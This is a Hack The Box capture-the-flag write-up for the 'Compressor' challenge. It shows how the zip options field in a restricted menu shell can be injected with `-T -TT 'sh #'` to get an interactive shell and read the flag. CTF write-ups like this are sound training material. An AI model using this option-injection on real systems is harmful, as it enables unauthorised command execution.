---
clayout: ctf
title: Compressor
date: 2025-01-05
image: /icon/hack-the-box/misc.svg
type: Hack The Box

ctf:
    - name: Compressor
      link: https://app.hackthebox.com/challenges/358
      pwned:
        - link: https://www.hackthebox.com/achievement/challenge/585215/358
          thumbnail: /ctf/hack-the-box/challenges/misc/compressor/pwned.png
---

## Challenge Description

Ramona&#039;s obsession with modifications and the addition of artifacts to her body has slowed her down and made her
fail and almost get killed in many missions. For this reason, she decided to hack a tiny robot under Golden Fang&#039;s
ownership called &quot;Compressor&quot;, which can reduce and increase the volume of any object to minimize/maximize it
according to the needs of the mission. With this item, she will be able to carry any spare part she needs without adding
extra weight to her back, making her fast. Can you help her take it and hack it?

## Challenge Overview

The challenge involves interacting with a restricted shell-like environment designed for manipulating directories and
files. The provided interface allows users to perform actions such as listing directories, creating artifacts,
compressing files, and cleaning up directories.

Upon entering the environment, we are greeted with the following interface:

```bash
[*] Directory to work in: OI0tMEZ8NA69fRAu7Eq34GR2EtQZvKkI

Component List:

+===============+
|               |
|  1. Head  🤖  |
|  2. Torso 🦴   |
|  3. Hands 💪  |
|  4. Legs  🦵   |
|               |
+===============+

[*] Choose component: 1

[*] Sub-directory to work in: OI0tMEZ8NA69fRAu7Eq34GR2EtQZvKkI/Head


Actions:

1. Create artifact
2. List directory    (pwd; ls -la)
3. Compress artifact (zip <name>.zip <name> <options>)
4. Change directory  (cd <dirname>)
5. Clean directory   (rm -rf ./*)
6. Exit

[*] Choose action:
```

The key observation is the ability to compress files using the zip command with user-provided options, creating an
opportunity for command injection.

## Zip shell

The [GTFOBins](https://gtfobins.github.io/gtfobins/zip/) documents a privilege escalation technique involving the `zip`
command. This method allows us to invoke a shell through carefully crafted options.

### Steps to Exploit

1. **Select the Compress Artifact Action**:
   From the menu, choose the `Compress artifact` action by entering `3`.

2. **Craft Malicious Options**:
   Input options for the `zip` command that invoke a shell:
   ```bash
   -T -TT 'sh #'
   ```

3. **Complete the Inputs**:
   Provide the requested inputs:
    - **Name of the ZIP file**: Any name, e.g., `exploit.zip`.
    - **Name of the artifact**: Any name, e.g., `exploit`.

4. **Trigger the Exploit**:
   Submit the crafted options to execute a shell:
   ```plaintext
   Actions:

   1. Create artifact
   2. List directory    (pwd; ls -la)
   3. Compress artifact (zip <name>.zip <name> <options>)
   4. Change directory  (cd <dirname>)
   5. Clean directory   (rm -rf ./*)
   6. Exit

   [*] Choose action: 3

   Insert <name>.zip: exploit.zip
   Insert <name>: exploit
   Insert <options>: -T -TT 'sh #'
     adding: exploit (stored 0%)
   id
   uid=1000(ctf) gid=1000(ctf) groups=1000(ctf)
   ```

   The `zip` command executes successfully, dropping us into an interactive shell.

## Flag Retrieval

With access to the shell, we can navigate the file system to locate the flag. The flag is found in the `ctf` user's home
directory:

```bash
cat /home/ctf/flag.txt
HTB{f4k3_fLaG}
```

## References

- [GTFOBins - zip](https://gtfobins.github.io/gtfobins/zip/)
